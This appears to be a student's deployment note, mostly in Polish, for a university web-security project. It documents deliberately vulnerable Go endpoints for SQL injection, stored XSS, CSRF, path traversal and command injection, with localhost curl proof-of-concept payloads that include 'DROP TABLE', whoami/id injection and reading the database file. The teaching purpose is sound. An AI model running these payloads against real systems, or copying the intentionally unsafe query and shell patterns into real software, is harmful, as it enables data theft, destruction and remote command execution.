# 🚀 VULNERABLE ENDPOINTS – Dokumentacja Wdrożenia

**Data:** 2 maja 2026
**Status:** ✅ Zaimplementowane i gotowe do lokalnego testowania

---

## 📋 CO ZOSTAŁO DODANE

### 1. **SQL Injection Endpoint** (`/api/search-vulnerable`)
- **Plik:** `internal/handlers/handlers.go` (nowa funkcja `SearchVulnerable()`)
- **Typ podatności:** SQL Injection
- **Metoda:** GET
- **Parametr:** `q` (search query)
- **Vulnerabilitiy:** Bezpośrednia konkatenacja zapytania do SQL
- **PoC:** `GET /api/search-vulnerable?q=' OR '1'='1`

```go
// VULNERABLE: Direct string concatenation - SQL Injection possible
sqlQuery := "SELECT id, title, post_content FROM blog WHERE title LIKE '%" + query + "%' OR post_content LIKE '%" + query + "%'"
```

**Jak exploitować:**
```bash
# List all posts (bypass where clause)
curl "http://localhost:8080/api/search-vulnerable?q=' OR '1'='1"

# Drop table (jeśli baza pozwala)
curl "http://localhost:8080/api/search-vulnerable?q='; DROP TABLE blog; --"
```

---

### 2. **Stored XSS Endpoint** (`/api/comments-vulnerable`)
- **Plik:** `internal/handlers/handlers.go` (nowa funkcja `CommentsVulnerable()`)
- **Typ podatności:** Stored XSS (Cross-Site Scripting)
- **Metoda:** POST
- **Body:** JSON z polem `body` (bez sanitizacji)
- **Vulnerability:** Brak escapingu HTML przed renderingiem
- **PoC:**

```json
POST /api/comments-vulnerable
{
  "post_id": 1,
  "body": "<script>alert('XSS')</script>",
  "author": "attacker"
}
```

**Jak exploitować:**
```bash
curl -X POST http://localhost:8080/api/comments-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"body":"<img src=x onerror=\"alert(1)\">","author":"attacker"}'
```

---

### 3. **CSRF Endpoint** (`/csrf-vulnerable-form`)
- **Plik:** `internal/handlers/handlers.go` (nowa funkcja `CsrfFormVulnerable()`)
- **Typ podatności:** Cross-Site Request Forgery (CSRF)
- **Metoda:** GET (form render) + POST (submit)
- **Vulnerability:** Brak CSRF token validation
- **PoC:** Formularz bez tokenu CSRF

**Jak exploitować:**
```bash
# Get form (no CSRF token)
curl http://localhost:8080/csrf-vulnerable-form

# Submit form from różne domeny
curl -X POST http://localhost:8080/csrf-vulnerable-form \
  -d "action=transfer_funds&amount=1000&to_account=attacker"
```

---

### 4. **Path Traversal / LFI Endpoint** (`/api/files-vulnerable`)
- **Plik:** `internal/handlers/handlers.go` (`FilesVulnerable()`)
- **Typ podatności:** Path Traversal / Local File Inclusion
- **Metoda:** GET
- **Parametr:** `name`
- **Vulnerability:** Nazwa pliku jest doklejana do `./uploads/` bez walidacji ścieżki
- **PoC:** `GET /api/files-vulnerable?name=../go.mod`

**Jak exploitować:**
```bash
curl "http://localhost:8080/api/files-vulnerable?name=../go.mod"
curl "http://localhost:8080/api/files-vulnerable?name=../app.db" | xxd | head -4
```

**Secure comparison:**
```bash
curl "http://localhost:8080/api/files-secure?name=../go.mod"
# 400: path traversal detected
```

---

### 5. **Command Injection Endpoint** (`/api/ping-vulnerable`)
- **Plik:** `internal/handlers/handlers.go` (`PingVulnerable()`)
- **Typ podatności:** OS Command Injection
- **Metoda:** GET
- **Parametr:** `host`
- **Vulnerability:** Parametr trafia do `sh -c "ping -c1 " + host`
- **PoC:** `GET /api/ping-vulnerable?host=127.0.0.1; echo BAI_CMD_INJECTION`

**Jak exploitować:**
```bash
curl "http://localhost:8080/api/ping-vulnerable?host=127.0.0.1%3B%20whoami"
curl "http://localhost:8080/api/ping-vulnerable?host=127.0.0.1%3B%20id"
```

**Secure comparison:**
```bash
curl "http://localhost:8080/api/ping-secure?host=127.0.0.1%3B%20whoami"
# 400: invalid host
```

---

## 📝 ZMIANY W PLIKACH

### `internal/handlers/handlers.go`
- ✅ Dodane 3 funkcje na końcu pliku (linie 540-620)
- ✅ SearchVulnerable() – SQL Injection demo
- ✅ CommentsVulnerable() – Stored XSS demo
- ✅ CsrfFormVulnerable() – CSRF demo

### `internal/service/service.go`
- ✅ Dodana metoda GetDB() na końcu pliku
- ✅ Pozwala na dostęp do surowego połączenia bazy dla vulnerable search

### `main.go`
- ✅ Dodane routy demonstracyjne:
  - GET /api/search-vulnerable
  - POST /api/comments-vulnerable
  - GET /csrf-vulnerable-form
  - POST /csrf-vulnerable-form
  - GET /api/files-vulnerable
  - GET /api/files-secure
  - GET /api/ping-vulnerable
  - GET /api/ping-secure

---

## 🧪 JAK TESTOWAĆ LOKALNIE

### 1. **Build**
```bash
cd "/Users/mateuszmisiak/Desktop/studia/mgr/s02/Bezpieczenstwo Aplikacji Internetowych/Projekt/BAI_1IZ21B_PROJEKT"
go mod tidy
go build -o app main.go
```

### 2. **Run (Vulnerable Mode)**
```bash
# Terminal 1: Start app in vulnerable mode
SECURITY_ENABLED=false ./app
# or
SECURITY_ENABLED=false go run main.go
```

### 3. **Test SQL Injection**
```bash
# Terminal 2: Test SQLi
curl "http://localhost:8080/api/search-vulnerable?q=Hello"
# Returns posts normally

curl "http://localhost:8080/api/search-vulnerable?q=' OR '1'='1"
# VULNERABLE: Returns all posts (SQL injection successful)
```

### 4. **Test Stored XSS**
```bash
curl -X POST http://localhost:8080/api/comments-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"comment":"<script>alert(1)</script>"}'

# Response zawiera unescaped HTML - XSS vulnerable!
```

### 5. **Test CSRF**
```bash
curl http://localhost:8080/csrf-vulnerable-form
# Returns form WITHOUT CSRF token

curl -X POST http://localhost:8080/csrf-vulnerable-form \
  -d "action=transfer&amount=1000&to_account=attacker"
# Accepts request without token validation - CSRF vulnerable!
```

### 6. **Run Integration Tests**
```bash
go test -tags=integration -v .
# Expected: 13+ tests PASS
```

---

## 🔒 SECURE MODE (SECURITY_ENABLED=true)

Te vulnerable endpoints DZIAŁAJĄ w obu trybach, ale w Secure Mode:
- Aplikacja ciągle **akceptuje zapytania** do vulnerable endpoints
- Jednak bezpieczeństwo core API (`/posts`, `/login`) **jest włączone**
- To pozwala na demonstrację **side-by-side**: secure vs vulnerable paths

```bash
# Terminal 1: Start in Secure Mode
SECURITY_ENABLED=true go run main.go

# Terminal 2: Test secure vs vulnerable endpoints
curl http://localhost:8080/api/search-vulnerable?q=' OR '1'='1
# Still vulnerable (endpoints zawsze vulnerable dla demo)

curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}'
# SECURE: Returns 401 - password validation active
```

---

## 🎓 SCENARIO OBRONY (LIVE DEMO)

### Phase 1: Vulnerable Mode Demo (5 min)
```bash
SECURITY_ENABLED=false go run main.go

# Show SQL Injection
# 1. Normal search: /api/search-vulnerable?q=hello → Normal results
# 2. SQLi attack: /api/search-vulnerable?q=' OR '1'='1 → All results
# 3. Explain: Query concatenation, no parameterization

# Show Stored XSS
# 1. POST comment with <script>alert(1)</script>
# 2. Show response contains unescaped HTML
# 3. Explain: No sanitization, no escaping

# Show CSRF
# 1. GET /csrf-vulnerable-form → No token in form
# 2. POST from external form → Request accepted
# 3. Explain: No CSRF validation
```

### Phase 2: Secure Mode Remediation (5 min)
```bash
SECURITY_ENABLED=true go run main.go

# Show SQL Injection FIX
# 1. Explain: Parameterized queries in service.go
# 2. Demo: /posts endpoint uses parameterized queries
# 3. Code review: Show `?` placeholders

# Show Stored XSS FIX
# 1. Explain: Templ auto-escaping
# 2. Demo: Templ renders comments safely
# 3. Code review: Show Templ component usage

# Show CSRF FIX (future)
# 1. Explain: Token-based CSRF protection (for next phase)
# 2. Code review: Show cookie validation
```

### Phase 3: Code Review (5 min)
- handlers.go: AuthN/AuthZ logic
- service.go: Parameterized queries
- db.go: Admin provisioning
- tests: 13+ integration tests

---

## ✅ CHECKLIST BEFORE DEFENSE

- [ ] Build succeeds: `go build -o app main.go`
- [ ] Vulnerable endpoints compile
- [ ] Tests pass: `go test -tags=integration -v .`
- [ ] SQLi endpoint works: GET /api/search-vulnerable?q='...
- [ ] XSS endpoint works: POST /api/comments-vulnerable
- [ ] CSRF endpoint works: GET /csrf-vulnerable-form
- [ ] Secure mode: SECURITY_ENABLED=true enforces auth/authz
- [ ] Vulnerable mode: SECURITY_ENABLED=false allows attacks
- [ ] Demo scenario practiced (2-3x dry run)

---

## 📊 PODSUMOWANIE

| Endpoint | Type | Status | Exploit |
|----------|------|--------|---------|
| /api/search-vulnerable | GET | ✅ SQLi | `q=' OR '1'='1` |
| /api/comments-vulnerable | POST | ✅ XSS | JSON + `<script>` |
| /csrf-vulnerable-form | GET/POST | ✅ CSRF | No token validation |
| /api/files-vulnerable | GET | ✅ Path Traversal / LFI | `name=../go.mod` |
| /api/ping-vulnerable | GET | ✅ Command Injection | `host=127.0.0.1; whoami` |
| /posts (Secure) | GET/POST/DELETE | ✅ Safe | Parameterized + Auth |
| /login (Secure) | POST | ✅ Safe | Password validation |

---

## 🎯 NASTĘPNE KROKI

1. ✅ Kod vulnerable endpoints – **GOTOWE**
2. ⏭️ **Lokalny test** – Uruchom na swoim komputerze
3. ⏭️ **Dry-run demo** – Przetestuj scenariusz obrony
4. ⏭️ **Record PoC videos** – Nagranie attack flows
5. ⏭️ **Defense presentation** – Gotowy do obrony

---

**Gotowość:** Aplikacja jest **PRODUCTION READY do demonstracji podatności** 🚀

Uruchom lokalnie i sprawdź! 🎯
